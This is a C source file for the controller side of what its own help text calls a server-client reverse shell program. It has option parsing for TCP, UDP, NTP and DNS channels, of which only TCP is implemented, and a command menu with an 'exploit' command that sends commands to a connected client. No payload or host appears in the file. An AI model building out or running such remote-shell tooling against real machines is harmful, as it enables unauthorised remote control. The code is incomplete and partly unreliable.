#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <string.h>
#include "Server.h"

/* ------ HELP ------- */
/*
			NAME
						main - server - client reverse shell programm

			SYNOPSIS
						./main [OPTIONS]
			DESCRIPTION

				It is a server help. To execute programm with different server connections see the required options below.

				--tcp			----->			create server with tcp connection
				--udp			----->			create server with udp connection
				--ntp			----->			create server with ntp connection
				--dns			----->			create server with dns connection
				--help			----->			show this help
*/

struct menu menus_objs[SHELL_CMD_NUM] = {
	//+flag bg or fg
	{"exit", EXIT_HELP, shell_exit, NULL, EXIT_ID, 0, FG},
	{"start_server", START_SERVER_HELP, server_connect, NULL, START_SERVER_ID, 1, FG},
	{"help", SHELL_HELP, shell_help, NULL, HELP_ID, 0, FG},
	{"server_disconect", SERVER_DISCONNECT_HELP, server_disconnect, NULL, DISCONNECT_ID, 0, FG},
	{"clear", CLEAR_HELP, shell_clear, NULL, CLEAR_ID, 0, FG},
	{"exploit", EXPLOIT_HELP, server_exploit, NULL, EXPLOIT_ID, 1, FG},
	{NULL, NULL, NULL, NULL, 0, 0, 0}
};

int server_exploit(struct menu *input)
{
	printf("Sending %s\n", input->cmd_name);

	server_object->server_write(input);
}

int server_connect(struct menu *input)
{
	int port = atoi(input->args[0]);
	server_object->server_init(port);
}

int server_disconnect(struct menu *input)
{
	server_object->server_disconnect();
}

int main(int argc, char *argv[])
{
	int choice;
	int c;
	int size;
	int option_index;
	static struct option long_options[] = 
	{
		{"tcp", no_argument, 0, 't'},
		{"udp", no_argument, 0, 'u'},
		{"ntp", no_argument, 0, 'n'},
		{"dns", no_argument, 0, 'd'},
		{"help", no_argument, 0, 'h'},
		{0, 0, 0, 0}
	};

	option_index = 0;
	c = getopt_long(argc, argv, "p:", long_options, &option_index);
	if (c == -1) {
		printf(SERVER_HELP);
		return ERR_OPTION;
	}
	switch(c) {
	case 't':
		server_object = create_shared_memory(sizeof(server_object));
		memcpy(server_object, &tcp_obj, sizeof(tcp_obj));
		server_object = (struct server*)server_object;
		break;
	case 'u':
		break;
	case 'n':
		break;
	case 'd':
		break;
	case 'h':
		printf(SERVER_HELP);
		return ERR_OPTION;
	case '?':
	default:
		printf(SERVER_HELP);
		printf("\n\nNo options specified. Abort\n\n");
		return ERR_OPTION;
	}
	shell_init();
	return shell_loop();
}
